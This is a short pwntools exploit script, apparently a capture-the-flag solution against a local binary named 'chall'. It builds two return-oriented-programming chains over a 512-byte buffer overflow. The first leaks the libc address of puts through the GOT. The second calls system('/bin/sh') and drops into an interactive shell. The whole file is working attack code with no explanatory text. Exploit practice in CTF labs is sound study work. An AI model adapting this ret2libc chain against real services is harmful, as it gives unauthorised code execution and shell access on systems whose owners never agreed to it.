#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')
context.terminal = ["tilix","-a","session-add-right","-e"]

# io = process("./chall")
io = remote("127.0.0.1", 1325)
libc = ELF("./libc.so.6")

pop_rdi = 0x0000000040126b
ret = 0x00000000401016

rop = flat([

	b"A"*512,
	b"B"*8,
	pop_rdi,
	exe.got['puts'],
	exe.sym.puts,
	exe.sym.main

])

io.sendlineafter("Enter your name : ", rop)
io.recvline()
libc.address = u64(io.recvn(6).ljust(8, b"\x00"))-libc.sym['puts']
print(hex(libc.address))

rop = flat([

	b"A"*512,
	b"B"*8,
	pop_rdi,
	next(libc.search(b'/bin/sh\x00')),
	ret,
	libc.sym.system

])
io.sendlineafter("Enter your name : ", rop)


io.interactive()

